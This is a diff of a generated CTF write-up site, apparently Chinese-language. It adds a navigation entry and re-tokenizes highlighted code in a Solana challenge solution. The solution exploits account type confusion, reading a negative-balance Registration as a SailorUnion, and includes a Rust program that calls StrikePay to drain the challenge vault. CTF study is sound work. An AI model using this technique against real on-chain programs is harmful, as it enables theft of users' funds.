@@ -2815,6 +2815,20 @@
   
   
     <li class="md-nav__item">
+      <a href="../movectf/dynamic_matrix_traversal/" class="md-nav__link">
+        DynamicMatrixTraversal
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../movectf/easy_game/" class="md-nav__link">
         EasyGame
       </a>
@@ -3726,7 +3740,7 @@
 <ul>
 <li>
 <p>目标是获取至少 <span class="arithmatex">\(10^8\)</span> lamports</p>
-<div class="highlight"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">TARGET_AMT</span>: <span class="kt">u64</span> <span class="o">=</span><span class="w"> </span><span class="mi">100_000_000</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">TARGET_AMT</span><span class="p">:</span><span class="w"> </span><span class="kt">u64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">100_000_000</span><span class="p">;</span>
 
 <span class="c1">// check solve</span>
 <span class="kd">let</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">challenge</span>
@@ -3737,7 +3751,7 @@
 <span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;lamports: {:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
 
 <span class="k">if</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">TARGET_AMT</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span>::<span class="n">read_to_string</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span><span class="p">::</span><span class="n">read_to_string</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
 <span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span>
 <span class="w">        </span><span class="n">socket</span><span class="p">,</span>
 <span class="w">        </span><span class="s">&quot;You successfully exploited the working class and stole their union dues! Congratulations!</span><span class="se">\n</span><span class="s">Flag: {}&quot;</span><span class="p">,</span>
@@ -3756,27 +3770,27 @@
 <li><strong>StrikePay</strong> 当 <code>available_funds</code> 不低于 <code>amt</code> 时，将 <code>amt</code> lamports 从 <code>vault</code> 转移到 <code>member</code>（增加 <code>user</code> 账户余额的唯一方法 :D）</li>
 <li><strong>RegisterMember</strong> 创建一个账户存储 <code>Registration</code> 结构的数据，初始 <code>balance</code> 为 -100</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">ins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SailorInstruction</span>::<span class="n">try_from_slice</span><span class="p">(</span><span class="n">instruction_data</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">ins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SailorInstruction</span><span class="p">::</span><span class="n">try_from_slice</span><span class="p">(</span><span class="n">instruction_data</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
 <span class="k">match</span><span class="w"> </span><span class="n">ins</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="n">SailorInstruction</span>::<span class="n">CreateUnion</span><span class="p">(</span><span class="n">bal</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span>::<span class="n">create_union</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">bal</span><span class="p">),</span>
-<span class="w">    </span><span class="n">SailorInstruction</span>::<span class="n">PayDues</span><span class="p">(</span><span class="n">amt</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span>::<span class="n">pay_dues</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">amt</span><span class="p">),</span>
-<span class="w">    </span><span class="n">SailorInstruction</span>::<span class="n">StrikePay</span><span class="p">(</span><span class="n">amt</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span>::<span class="n">strike_pay</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">amt</span><span class="p">),</span>
-<span class="w">    </span><span class="n">SailorInstruction</span>::<span class="n">RegisterMember</span><span class="p">(</span><span class="n">member</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span>::<span class="n">register_member</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">member</span><span class="p">)</span>
+<span class="w">    </span><span class="n">SailorInstruction</span><span class="p">::</span><span class="n">CreateUnion</span><span class="p">(</span><span class="n">bal</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span><span class="p">::</span><span class="n">create_union</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">bal</span><span class="p">),</span>
+<span class="w">    </span><span class="n">SailorInstruction</span><span class="p">::</span><span class="n">PayDues</span><span class="p">(</span><span class="n">amt</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span><span class="p">::</span><span class="n">pay_dues</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">amt</span><span class="p">),</span>
+<span class="w">    </span><span class="n">SailorInstruction</span><span class="p">::</span><span class="n">StrikePay</span><span class="p">(</span><span class="n">amt</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span><span class="p">::</span><span class="n">strike_pay</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">amt</span><span class="p">),</span>
+<span class="w">    </span><span class="n">SailorInstruction</span><span class="p">::</span><span class="n">RegisterMember</span><span class="p">(</span><span class="n">member</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">processor</span><span class="p">::</span><span class="n">register_member</span><span class="p">(</span><span class="n">program_id</span><span class="p">,</span><span class="w"> </span><span class="n">accounts</span><span class="p">,</span><span class="w"> </span><span class="n">member</span><span class="p">)</span>
 <span class="p">}</span>
 </code></pre></div>
 </li>
 <li>
 <p><code>SailorUnion</code> 和 <code>Registration</code> 的字段是重合的，且 <code>balance</code> 的类型为 <code>i64</code>，若按照 <code>SailorUnion</code> 反序列化 <code>balance</code> 为负数的 <code>Registration</code> 类型的数据，将得到一个数值很大的 <code>u64</code>，同时 <code>member</code> 对应 <code>authority</code></p>
 <div class="highlight"><pre><span></span><code><span class="cp">#[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)]</span>
-<span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">SailorUnion</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="n">available_funds</span>: <span class="kt">u64</span><span class="p">,</span>
-<span class="w">    </span><span class="n">authority</span>: <span class="p">[</span><span class="kt">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">32</span><span class="p">],</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">SailorUnion</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">available_funds</span><span class="p">:</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span>
+<span class="w">    </span><span class="n">authority</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="kt">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">32</span><span class="p">],</span>
 <span class="p">}</span>
 
 <span class="cp">#[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)]</span>
-<span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Registration</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="n">balance</span>: <span class="kt">i64</span><span class="p">,</span>
-<span class="w">    </span><span class="n">member</span>: <span class="p">[</span><span class="kt">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">32</span><span class="p">],</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">Registration</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">balance</span><span class="p">:</span><span class="w"> </span><span class="kt">i64</span><span class="p">,</span>
+<span class="w">    </span><span class="n">member</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="kt">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">32</span><span class="p">],</span>
 <span class="p">}</span>
 </code></pre></div>
 </li>
@@ -3806,19 +3820,19 @@ $<span class="w"> </span>cargo-build-bpf
 <span class="n">crate-type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;cdylib&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;rlib&quot;</span><span class="p">]</span>
 </code></pre></div>
 </details>
-<div class="highlight"><pre><span></span><code><span class="k">use</span><span class="w"> </span><span class="n">borsh</span>::<span class="p">{</span><span class="w"> </span><span class="n">BorshSerialize</span><span class="w"> </span><span class="p">};</span>
-<span class="k">use</span><span class="w"> </span><span class="n">solana_program</span>::<span class="p">{</span>
-<span class="w">    </span><span class="n">account_info</span>::<span class="p">{</span><span class="w"> </span><span class="n">next_account_info</span><span class="p">,</span><span class="w"> </span><span class="n">AccountInfo</span><span class="w"> </span><span class="p">},</span>
-<span class="w">    </span><span class="n">instruction</span>::<span class="p">{</span><span class="w"> </span><span class="n">AccountMeta</span><span class="p">,</span><span class="w"> </span><span class="n">Instruction</span><span class="w"> </span><span class="p">},</span>
-<span class="w">    </span><span class="n">entrypoint</span>::<span class="n">ProgramResult</span><span class="p">,</span>
+<div class="highlight"><pre><span></span><code><span class="k">use</span><span class="w"> </span><span class="n">borsh</span><span class="p">::{</span><span class="w"> </span><span class="n">BorshSerialize</span><span class="w"> </span><span class="p">};</span>
+<span class="k">use</span><span class="w"> </span><span class="n">solana_program</span><span class="p">::{</span>
+<span class="w">    </span><span class="n">account_info</span><span class="p">::{</span><span class="w"> </span><span class="n">next_account_info</span><span class="p">,</span><span class="w"> </span><span class="n">AccountInfo</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">instruction</span><span class="p">::{</span><span class="w"> </span><span class="n">AccountMeta</span><span class="p">,</span><span class="w"> </span><span class="n">Instruction</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">entrypoint</span><span class="p">::</span><span class="n">ProgramResult</span><span class="p">,</span>
 <span class="w">    </span><span class="n">entrypoint</span><span class="p">,</span>
-<span class="w">    </span><span class="n">program</span>::<span class="n">invoke</span><span class="p">,</span>
-<span class="w">    </span><span class="n">pubkey</span>::<span class="n">Pubkey</span><span class="p">,</span>
+<span class="w">    </span><span class="n">program</span><span class="p">::</span><span class="n">invoke</span><span class="p">,</span>
+<span class="w">    </span><span class="n">pubkey</span><span class="p">::</span><span class="n">Pubkey</span><span class="p">,</span>
 <span class="w">    </span><span class="n">system_program</span><span class="p">,</span>
 <span class="p">};</span>
 
 <span class="cp">#[derive(BorshSerialize)]</span>
-<span class="k">pub</span><span class="w"> </span><span class="k">enum</span> <span class="nc">SailorInstruction</span><span class="w"> </span><span class="p">{</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="nc">SailorInstruction</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="n">CreateUnion</span><span class="p">(</span><span class="kt">u64</span><span class="p">),</span>
 <span class="w">    </span><span class="n">PayDues</span><span class="p">(</span><span class="kt">u64</span><span class="p">),</span>
 <span class="w">    </span><span class="n">StrikePay</span><span class="p">(</span><span class="kt">u64</span><span class="p">),</span>
@@ -3827,11 +3841,11 @@ $<span class="w"> </span>cargo-build-bpf
 
 <span class="n">entrypoint</span><span class="o">!</span><span class="p">(</span><span class="n">process_instruction</span><span class="p">);</span>
 
-<span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">process_instruction</span><span class="p">(</span>
-<span class="w">    </span><span class="n">_program_id</span>: <span class="kp">&amp;</span><span class="nc">Pubkey</span><span class="p">,</span>
-<span class="w">    </span><span class="n">accounts</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span>
-<span class="w">    </span><span class="n">_instruction_data</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">],</span>
-<span class="p">)</span><span class="w"> </span>-&gt; <span class="nc">ProgramResult</span><span class="w"> </span><span class="p">{</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">process_instruction</span><span class="p">(</span>
+<span class="w">    </span><span class="n">_program_id</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">Pubkey</span><span class="p">,</span>
+<span class="w">    </span><span class="n">accounts</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span>
+<span class="w">    </span><span class="n">_instruction_data</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">],</span>
+<span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nc">ProgramResult</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">iter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">accounts</span><span class="p">.</span><span class="n">iter</span><span class="p">();</span>
 <span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">chall_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">next_account_info</span><span class="p">(</span><span class="n">iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
 <span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">registration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">next_account_info</span><span class="p">(</span><span class="n">iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
@@ -3840,14 +3854,14 @@ $<span class="w"> </span>cargo-build-bpf
 
 <span class="w">    </span><span class="n">invoke</span><span class="p">(</span>
 <span class="w">        </span><span class="o">&amp;</span><span class="n">Instruction</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="n">program_id</span>: <span class="o">*</span><span class="n">chall_id</span><span class="p">.</span><span class="n">key</span><span class="p">,</span>
-<span class="w">            </span><span class="n">data</span>: <span class="nc">SailorInstruction</span>::<span class="n">StrikePay</span><span class="p">(</span><span class="mi">100_000_000</span><span class="p">).</span><span class="n">try_to_vec</span><span class="p">().</span><span class="n">unwrap</span><span class="p">(),</span>
-<span class="w">            </span><span class="n">accounts</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[</span>
-<span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">registration</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
-<span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
-<span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span>
-<span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">vault</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
-<span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span>::<span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
+<span class="w">            </span><span class="n">program_id</span><span class="p">:</span><span class="w"> </span><span class="o">*</span><span class="n">chall_id</span><span class="p">.</span><span class="n">key</span><span class="p">,</span>
+<span class="w">            </span><span class="n">data</span><span class="p">:</span><span class="w"> </span><span class="nc">SailorInstruction</span><span class="p">::</span><span class="n">StrikePay</span><span class="p">(</span><span class="mi">100_000_000</span><span class="p">).</span><span class="n">try_to_vec</span><span class="p">().</span><span class="n">unwrap</span><span class="p">(),</span>
+<span class="w">            </span><span class="n">accounts</span><span class="p">:</span><span class="w"> </span><span class="nc">vec</span><span class="o">!</span><span class="p">[</span>
+<span class="w">                </span><span class="n">AccountMeta</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">registration</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
+<span class="w">                </span><span class="n">AccountMeta</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
+<span class="w">                </span><span class="n">AccountMeta</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span>
+<span class="w">                </span><span class="n">AccountMeta</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">vault</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
+<span class="w">                </span><span class="n">AccountMeta</span><span class="p">::</span><span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span><span class="p">::</span><span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span>
 <span class="w">            </span><span class="p">],</span>
 <span class="w">        </span><span class="p">},</span>
 <span class="w">        </span><span class="o">&amp;</span><span class="p">[</span>
